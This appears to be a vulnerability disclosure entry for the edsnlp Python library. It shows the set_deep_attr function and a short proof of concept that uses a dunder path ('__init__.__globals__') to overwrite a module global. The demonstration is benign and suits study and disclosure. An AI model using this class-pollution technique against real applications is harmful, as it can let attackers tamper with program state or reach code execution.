## edsnlp

### Meta

+ Library: edsnlp
+ Stars: 119
+ Version: v0.15.0
+ CVE: N/A
+ Status: Pending
+ Payload: ```set_deep_attr(obj, '__init__.__globals__.__name__', 'polluted')```
+ Foundby: redacted
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/aphp/edsnlp

### Vulnerable Code Snippet

```python
def set_deep_attr(base, names, val):
    if isinstance(names, str):
        names = split_names(names)
    if len(names) == 0:
        return val
    if len(names) == 1:
        if isinstance(base, (dict, list)):
            base[names[0]] = val
        else:
            setattr(base, names[0], val)
    [current, *remaining] = names
    attr = base[current] if isinstance(base, (dict, list)) else getattr(base, current)
    try:
        set_deep_attr(attr, remaining, val)
    except TypeError:
        new_attr = list(attr)
        set_deep_attr(new_attr, remaining, val)
        return set_attr_item(base, current, tuple(new_attr))
    return base
```
### PoC

```python
from edsnlp.utils.collections import set_deep_attr
import subprocess
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)

set_deep_attr(obj, '__init__.__globals__.__name__', 'polluted')
print(__name__)
```